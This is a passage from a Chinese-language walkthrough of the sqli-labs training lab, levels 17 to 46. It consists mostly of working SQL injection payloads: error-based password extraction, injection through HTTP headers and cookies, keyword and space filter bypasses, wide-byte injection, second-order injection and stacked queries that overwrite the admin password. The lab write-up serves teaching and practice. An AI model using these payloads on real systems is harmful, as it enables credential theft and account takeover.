+</pre></td><td class="rouge-code"><pre><span class="err">用户名</span><span class="p">:</span> <span class="k">admin</span><span class="s1">' and 1=1#
+密码: 1
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>再试密码注入：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="err">用户名</span><span class="p">:</span> <span class="k">admin</span>
+<span class="err">密码</span><span class="p">:</span> <span class="mi">1</span><span class="s1">' and 1=1#
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>用户名一定写</strong></p>
+
+<p>Less-17即使用户名在后面也要写。</p>
+
+<p><em>打个比方：</em></p>
+
+<p>就像你要给朋友家换锁：</p>
+
+<ul>
+  <li><strong>用户名不存在</strong>：找错房子，锁没换成，你放的”东西”也没机会起作用</li>
+  <li><strong>用户名存在</strong>：找对房子，开始换锁，趁机在换锁过程中搞点”小动作”</li>
+</ul>
+
+<p>而<code class="language-plaintext highlighter-rouge">or 1=1</code>一般不能在网络渗透中使用。</p>
+
+<ul>
+  <li><strong>影响太大</strong>。如果users表有100个用户，<code class="language-plaintext highlighter-rouge">or 1=1</code>这一下就改了100个人的密码。</li>
+  <li><strong>容易被发现</strong>。日志里看到批量修改，多个用户同时无法登录，管理员马上知道被攻击了</li>
+</ul>
+
+<p><strong>不能同时查询和更新同一个表</strong></p>
+
+<p>错误写法：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="k">User</span> <span class="n">Name</span><span class="p">:</span> <span class="k">admin</span>
+<span class="k">New</span> <span class="n">Password</span><span class="p">:</span> <span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select concat(username,'</span><span class="p">:</span><span class="s1">',password) from users limit 0,1)),1)#
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>解决方法：用子查询嵌套一层</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,
+    (select concat(username,'</span><span class="p">:</span><span class="s1">',password) from 
+        (select username,password from users limit 0,1) tmp
+    )
+),1)#
+回显：XPATH syntax error:'</span><span class="o">~</span><span class="n">Dumb</span><span class="p">:</span><span class="mi">1</span><span class="s1">'
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-17</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="n">Username</span><span class="p">:</span> <span class="k">admin</span><span class="s1">'
+Password: admin
+回显：错误
+---
+Username: admin
+Password: admin'</span>
+<span class="err">回显：</span><span class="n">successfully</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>明显密码是注入点，确认闭合。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">Username</span><span class="p">:</span> <span class="k">admin</span>
+<span class="n">Password</span><span class="p">:</span> <span class="k">admin</span><span class="s1">' or 1=1#
+回显：successfully
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>爆数据库名</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,database()),1)#
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>爆表名</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">')),1)#
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>爆字段名</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">')),1)#
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>但是数据这里不能像正常报错注入那样爆。<strong>不能同时查询和更新同一个表</strong>，用子查询嵌套一层</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,
+    (select concat(username,'</span><span class="p">:</span><span class="s1">',password) from 
+        (select username,password from users limit 0,1) tmp
+    )
+),1)#
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-18http头user-agent注入">Less-18(HTTP头User-Agent注入)</h3>
+
+<p><strong>关键</strong>：用户名密码被过滤了，但<strong><em>User-Agent没过滤</em></strong>！</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/sql/Less-18/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="s">......</span>
+<span class="na">Upgrade-Insecure-Recruests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">User-Agent</span><span class="p">:</span><span class="s">',1,updatexml(1,concat(0x7e,database()),1))#</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>必须先登录</strong>，后面的就是基于HTTP头的<code class="language-plaintext highlighter-rouge">User-Agent</code>报错注入。</p>
+
+<h3 id="less-19http头referer注入">Less-19(HTTP头Referer注入)</h3>
+
+<p><strong><em>注入点：Referer头</em></strong></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/sql/Less-19/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="s">......</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http: //127.0.0.1/sq1/Less-19/',updatexml(1,concat0x7e,database()),1))#</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Referer头不能为空</strong>，保留前面的URL部分后面的就是基于HTTP头的<code class="language-plaintext highlighter-rouge">Referer</code>报错注入。</p>
+
+<h3 id="less-20http头cookie注入">Less-20(HTTP头cookie注入)</h3>
+
+<p>提交表单后会发现还有一个包被放出来。拦截这个包，这里面有cookie。于是进行基于HTTP头的cookie报错注入。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/sql/Less-20/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="s">......</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">uname=admin' and updatexml(1,concat(0x7e,database()),1)#; PHPSESSID=lesqfe3paefvci180fv0lpgn8h</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>cookie头不能为空</strong>，保留前面的admin后面的就是基于HTTP头的<code class="language-plaintext highlighter-rouge">cookie</code>报错注入。</p>
+
+<h3 id="less-21less-22http头加密注入">Less-21、Less-22(HTTP头加密注入)</h3>
+
+<p><strong>Less-21</strong>（单引号加括号闭合）</p>
+
+<p>这题跟上一题差不多，只是cookie加密了（base64加密）。</p>
+
+<p>对payload加密。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/sql/Less-21/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="s">......</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpKSwxKSM=原码:admin' and updatexml(1,concat(0x7e,database()),1)#; PHPSESSID=lesqfe3paefvci180fv0lpgn8h</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-22</strong>（双引号闭合）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">admin</span><span class="nv">" and updatexml(1,concat(0x7e,database()),1)#再base64加密
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="进阶">进阶</h2>
+
+<h3 id="less-23过滤注释符">Less-23(过滤注释符)</h3>
+
+<p>第23关跟前22关不一样，它<strong>过滤了 <code class="language-plaintext highlighter-rouge">--+</code> 和 <code class="language-plaintext highlighter-rouge">#</code> 注释符</strong>！</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>看似一切回到了Less-1，实则需要考虑后端闭合了。</p>
+
+<p>但是尝试注入时发现，联合注入没有回显位置。只能用报错注入。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and updatexml(1,concat(0x7e,database()),1) and '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong><em>关键点</em></strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">要点</th>
+      <th style="text-align: left">说明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><strong>闭合方式</strong></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">'</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>不用注释符</strong></td>
+      <td style="text-align: left">用 <code class="language-plaintext highlighter-rouge">and '1'='1</code> 闭合后面引号</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>注入方法</strong></td>
+      <td style="text-align: left">报错注入（updatexml）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong>不能用的</strong></td>
+      <td style="text-align: left">UNION（无回显）</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Less-24(二次注入)</strong></p>
+
+<ul>
+  <li><strong>二次注入：</strong>==存入==恶意数据-&gt;数据库==藏雷==-&gt;调用时==程序读==出来拼SQL-&gt;==触发==注入</li>
+</ul>
+
+<p><strong>注册的时候埋雷，改密码的时候炸。</strong>先注册一个账号名叫<code class="language-plaintext highlighter-rouge">admin' #</code>。</p>
+
+<pre><code class="language-txt">Desired Username: admin'#
+Password: 123
+</code></pre>
+
+<p>将有污染的数据写入数据库。单引号是为了和之后密码修的用户名的单引号进行闭合，#是为了注释后面的数据。</p>
+
+<p>登入后<strong>再</strong>修改密码，这个时候修改<code class="language-plaintext highlighter-rouge">admin'#</code>密码修改的是真正的<code class="language-plaintext highlighter-rouge">admin</code>的密码。修改后退出登录再<code class="language-plaintext highlighter-rouge">admin</code>登录（密码是改过的）</p>
+
+<ul>
+  <li><strong>改密码时</strong><code class="language-plaintext highlighter-rouge">admin'#</code>里的<code class="language-plaintext highlighter-rouge">#</code>会注释掉后面的条件，从而改掉<code class="language-plaintext highlighter-rouge">admin</code>的密码</li>
+</ul>
+
+<h3 id="less-25过滤and和or">Less-25(过滤<code class="language-plaintext highlighter-rouge">and</code>和<code class="language-plaintext highlighter-rouge">or</code>)</h3>
+
+<p>第二十五关根据提示是将or和and这两个替换成空。大小写绕过没有用。但是可以采用双写绕过。本次关卡使用联合注入就可以了。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' oorrder by 3--+
+?id=-1'</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="k">database</span><span class="p">()</span> <span class="c1">--+</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">2</span><span class="s1">' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">'--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-26less-27less-28过滤">Less-26、Less-27、Less-28(过滤)</h3>
+
+<p><strong>Less-26(逻辑运算符，注释符和空格)</strong></p>
+
+<p>测试输入发现逻辑运算符，注释符以及空格给过滤了。对于空格，有较多的方法绕过：</p>
+
+<p>%09 TAB键（水平）	%0a 新建一行		%0c 新的一页		%0d return功能		%0b TAB键（垂直）	%a0 空格		() 括号</p>
+
+<p><strong>方法1：报错注入（推荐，不用空格）</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 爆数据库名</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'||updatexml(1,concat(0x7e,database()),1)||'</span><span class="mi">1</span>
+
+<span class="c1">-- 爆表名（注意information双写）</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)='</span><span class="k">security</span><span class="s1">')),1)||'</span><span class="mi">1</span>
+
+<span class="c1">-- 爆字段名（and双写）</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='</span><span class="k">security</span><span class="s1">'anandd(table_name='</span><span class="n">users</span><span class="s1">'))),1)||'</span><span class="mi">1</span>
+
+<span class="c1">-- 爆数据（password双写）</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'||updatexml(1,concat(0x7e,(select(group_concat(passwoorrd))from(users))),1)||'</span><span class="mi">1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>方法2：联合查询（需要用%0a代替空格）</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 先找字段数</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'%0aoorrder%0aby%0a3%0aand%0a'</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+
+<span class="c1">-- 爆数据库名</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'%0aunion%0aselect%0a1,2,database()%0aand%0a'</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+
+<span class="c1">-- 爆表名</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'%0aunion%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema='</span><span class="k">security</span><span class="s1">'%0aand%0a'</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-26a(与26过滤一样)</strong></p>
+
+<p><strong>闭合方式</strong>：26a是 <code class="language-plaintext highlighter-rouge">')</code> 闭合（带括号）。</p>
+
+<p>有显示位，所以最快的方式是<em>联合注入</em>。也可以用<em>盲注</em>。但是不能用报错注入因为没有报错信息。</p>
+
+<p><strong>Less-27</strong></p>
+
+<p>和二十六差不多不过二十七关没有过滤<code class="language-plaintext highlighter-rouge">and</code>和<code class="language-plaintext highlighter-rouge">or</code>,过滤了<code class="language-plaintext highlighter-rouge">select</code>和<code class="language-plaintext highlighter-rouge">union</code>。可以大小写绕过以及重写绕过。这里直接报错注入。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'or(updatexml(1,concat(0x7e,database()),1))or'</span><span class="mi">0</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-27a</strong></p>
+
+<p>双引号闭合且页面不显示报错信息，过滤规则和二十七关一样。使用盲注和联合注入。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="nv">"uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand"</span><span class="mi">1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-28(与27过滤一样)</strong></p>
+
+<p>闭合变成<code class="language-plaintext highlighter-rouge">')</code>，剩下的与27题一样</p>
+
+<p><strong>Less-28(与27a过滤一样)</strong></p>
+
+<p>闭合变成<code class="language-plaintext highlighter-rouge">')</code>，剩下的与27a题一样</p>
+
+<h3 id="less-29less-30less-31双服务器">Less-29、Less-30、Less-31(双服务器)</h3>
+
+<p><strong>第29关</strong>引入了<strong>双服务器架构</strong>和<strong>HTTP参数污染（HPP）</strong>的概念</p>
+
+<ul>
+  <li><strong>前端服务器（Tomcat/JSP）</strong>：充当WAF，只校验第一个参数，必须是数字</li>
+  <li><strong>后端服务器（Apache/PHP）</strong>：真正提供Web服务，处理最后一个参数</li>
+</ul>
+
+<p><em>双服务器: 利用前后端对同一个参数名的解析差异来绕过防护的一种攻击技术。</em></p>
+
+<p><em>WAF: Web应用防火墙，Web Application Firewall</em></p>
+
+<p><strong>工作流程：</strong></p>
+
+<ol>
+  <li>客户端请求先到Tomcat（WAF）</li>
+  <li>Tomcat只检查第一个参数（必须是数字）</li>
+  <li>通过后，Tomcat把<strong>整个查询字符串</strong>传给Apache</li>
+  <li>Apache解析<strong>最后一个参数</strong>并执行SQL</li>
+</ol>
+
+<ul>
+  <li>在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。sql语句在接受相同参数时候接受的是后面的参数值。</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">' union select 1,database(),3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第30关</strong>将29关的单引号换成双引号。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="nv">" union select 1,database(),3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第31关</strong>将30关的双引号后面再加一个括号。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="nv">") union select 1,database(),3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-32less-33宽字节注入">Less-32、Less-33(宽字节注入)</h3>
+
+<p><strong>第32关</strong>使用<code class="language-plaintext highlighter-rouge">preg_replace</code>函数将斜杠，单引号和双引号过滤了，如果输入<code class="language-plaintext highlighter-rouge">id=1"</code>会变成<code class="language-plaintext highlighter-rouge">id=1\"</code>。但是数据库使用了GBK编码，这里就可以采用宽字节注入。</p>
+
+<p><em>GBK: 国家标准扩展。占两个字节。</em></p>
+
+<p>向浏览器发送：<code class="language-plaintext highlighter-rouge">?id=%df'</code></p>
+
+<p>PHP 用 <code class="language-plaintext highlighter-rouge">addslashes()</code> 转义 —&gt; 结果：<code class="language-plaintext highlighter-rouge">%df%5c%27</code></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">' union select 1,database(),3 --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第33关</strong>与32关一样。检查函数换了但是效果一样。</p>
+
+<p><strong>Less-34</strong></p>
+
+<p>POST版的宽字节注入。</p>
+
+<p><strong>Less-35</strong></p>
+
+<p>数字型的宽字节注入。不需要引号闭合。主要影响在与后续爆字段时候需要用的表名加了引号，只需将<strong>表名</strong>换成<strong>十六进制编码</strong>就行。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">),</span><span class="mi">3</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">and</span> <span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="c1">--+   #爆字段</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Less-36、Less-37</strong></p>
+
+<p>依然是宽字节注入，换了个函数。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">关卡</th>
+      <th style="text-align: left">过滤函数</th>
+      <th style="text-align: left">函数类型</th>
+      <th style="text-align: left">是否依赖字符集</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">32关</td>
+      <td style="text-align: left">自定义正则过滤</td>
+      <td style="text-align: left">自定义</td>
+      <td style="text-align: left">否</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">33关</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">addslashes()</code></td>
+      <td style="text-align: left">PHP内置</td>
+      <td style="text-align: left">否</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">36关</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">mysql_real_escape_string()</code></td>
+      <td style="text-align: left">MySQL专用</td>
+      <td style="text-align: left"><strong>是</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="language-plaintext highlighter-rouge">mysql_real_escape_string()</code>会根据<strong>当前数据库连接的字符集</strong>来智能转义特殊字符，只需将<strong>表名</strong>换成<strong>十六进制编码</strong>就行。</p>
+
+<p>Less-36 以GET形式，Less-37 以POST形式。</p>
+
+<h2 id="高阶">高阶</h2>
+
+<h3 id="less-38堆叠注入">Less-38(堆叠注入)</h3>
+
+<p>堆叠注入就是可以执行多个语句的SQL注入。可以进行<strong>增删改查</strong>所有操作。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">';show tables;--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>但是由于回显位置有限，所以不能显示表。任何注入方式都可以任意查询。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">' union select 1,2,database()--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-39less-40less-41">Less-39、Less-40、Less-41</h3>
+
+<p>第三十九关id参数是整数，正常联合注入就行。<code class="language-plaintext highlighter-rouge"> </code></p>
+
+<p>第四十关id参数是单引号加括号闭合，然后使用联合注入就可以了。<code class="language-plaintext highlighter-rouge">')</code></p>
+
+<p>第四十一关不能使用报错注入因为没有报错信息。其他注入都可以。id参数是整数。<code class="language-plaintext highlighter-rouge"> </code></p>
+
+<h3 id="less-42post堆叠">Less-42(POST堆叠)</h3>
+
+<ul>
+  <li>第42关<strong>结合了二次注入和堆叠注入</strong>，而且注入点在<strong>密码字段</strong>。</li>
+</ul>
+
+<pre><code class="language-mermaid">graph LR
+    A[1. 登录页面注入&lt;br&gt;创建新用户] --&gt; B[2. 用新用户登录&lt;br&gt;正常登录]
+    B --&gt; C[3. 改密码页面注入&lt;br&gt;修改admin密码]
+    C --&gt; D[4. 用admin/新密码登录]
+</code></pre>
+
+<p><strong>步骤1</strong>：登录页面创建用户</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">login_user</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">login_password</span><span class="o">=</span><span class="mi">1</span><span class="s1">'; insert into users(username,password) values('</span><span class="n">less30</span><span class="s1">','</span><span class="mi">123456</span><span class="s1">'); --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤2</strong>：用新用户正常登录（不要注入）</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">login_user=less30&amp;login_password=123456
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤3</strong>：进入改密码页面，在新密码处注入</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">new_password</span><span class="o">=</span><span class="n">hacked</span><span class="s1">'; update users set password='</span><span class="n">hacker</span><span class="s1">' where username='</span><span class="k">admin</span><span class="s1">'; --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>步骤4</strong>：用 <code class="language-plaintext highlighter-rouge">admin/hacker</code> 登录验证</p>
+
+<h3 id="less-43less-44less-45">Less-43、Less-44、Less-45</h3>
+
+<p>43关闭合方式：<code class="language-plaintext highlighter-rouge">')</code></p>
+
+<p>44关无报错，闭合方式：<code class="language-plaintext highlighter-rouge">'</code></p>
+
+<p>45关无报错，闭合方式：<code class="language-plaintext highlighter-rouge">')</code></p>
+
+<h3 id="less-46order-by注入">Less-46(ORDER BY注入)</h3>
+
+<p>第46关和前面的关卡完全不同——注入点在<strong><code class="language-plaintext highlighter-rouge">ORDER BY</code>子句</strong>里！</p>
+
